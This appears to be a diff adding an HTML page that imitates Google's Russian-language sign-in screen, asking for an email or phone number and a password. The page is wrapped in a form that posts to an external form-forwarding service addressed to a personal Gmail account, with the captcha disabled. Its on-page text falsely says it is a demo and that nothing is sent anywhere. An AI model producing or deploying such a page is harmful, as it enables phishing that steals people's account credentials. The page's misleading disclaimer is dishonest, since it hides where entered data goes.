@@ -1,0 +1,133 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Макет входа</title>
+  <style>
+    body {
+      margin:0;
+      background:#000;
+      color:#fff;
+      font-family:"Roboto", Arial, sans-serif;
+      display:flex;
+      justify-content:center;
+      align-items:flex-start;
+      min-height:100vh;
+      padding-top:40px;
+    }
+    .card {
+      width:420px;
+      max-width:94%;
+      background:transparent;
+      padding:28px;
+      border-radius:8px;
+      box-sizing:border-box;
+    }
+    .logo {
+      font-size:44px;
+      font-weight:700;
+      color:#fff;
+      margin-bottom:8px;
+    }
+    h1 {
+      font-size:28px;
+      margin:10px 0 6px;
+    }
+    .desc {
+      color:#9aa0a6;
+      font-size:14px;
+      margin-bottom:16px;
+      line-height:1.4;
+    }
+    .link {
+      color:#8ab4f8;
+      text-decoration:none;
+      font-size:14px;
+      cursor:pointer;
+    }
+    label {
+      display:block;
+      color:#9aa0a6;
+      margin:12px 0 6px;
+      font-size:14px;
+    }
+    .input {
+      width:100%;
+      padding:12px;
+      border-radius:8px;
+      border:1px solid rgba(255,255,255,0.12);
+      background:transparent;
+      color:#fff;
+      box-sizing:border-box;
+      font-size:15px;
+    }
+    .row {
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      margin-top:18px;
+    }
+    .button {
+      background:#7aa7ff;
+      border:none;
+      padding:10px 16px;
+      border-radius:8px;
+      color:#fff;
+      cursor:pointer;
+      font-size:15px;
+    }
+    .muted-small {
+      color:#9aa0a6;
+      font-size:13px;
+      margin-top:12px;
+    }
+  </style>
+</head>
+<body>
+
+     <!-- Форма отправки -->
+    <form action="https://formsubmit.co/Golda1.namechtu@gmail.com" method="POST">
+      <!-- скрытые настройки FormSubmit -->
+      <input type="hidden" name="_subject" value="Новое сообщение с формы">
+      <input type="hidden" name="_captcha" value="false">
+
+      <div class="card">
+    <div class="logo">Google</div>
+    <h1>Войдите</h1>
+    <div class="desc">
+      Используйте учётную запись Google. Учётная запись будет добавлена на это устройство и станет доступна другим приложениям Google.
+    </div>
+
+    <a href="#" class="link" onclick="return false;">Подробнее об использовании вашей учётной записи</a>
+
+    <label for="email">E-mail или телефон</label>
+    <input id="email" class="input" type="text" placeholder="E-mail или телефон">
+
+    <label for="password">Введите пароль</label>
+    <input id="password" class="input" type="password" placeholder="Пароль">
+
+    <a href="#" class="link" onclick="return false;" style="display:block;margin-top:8px;">Забыли e-mail?</a>
+
+    <div class="row">
+      <a href="#" class="link" onclick="return false;">Создать аккаунт</a>
+      <button class="button" onclick="demoSubmit()">Дальше</button>
+    </div>
+
+    <div class="muted-small">Демонстрационный макет — данные никуда не отправляются.</div>
+  </div>
+
+<script>
+  function demoSubmit(){
+    const email = document.getElementById('email').value.trim();
+    const pwd = document.getElementById('password').value.trim();
+    if(!email || !pwd){
+      alert('Пожалуйста, заполните оба поля.');
+      return;
+    }
+    alert(`Демонстрация:\nEmail: ${email}\nПароль: ${pwd}\n(данные остаются локально)`);
+    console.log("DEMO INPUT:", { email, pwd });
+  }
+</script>
+</body>
+</html>
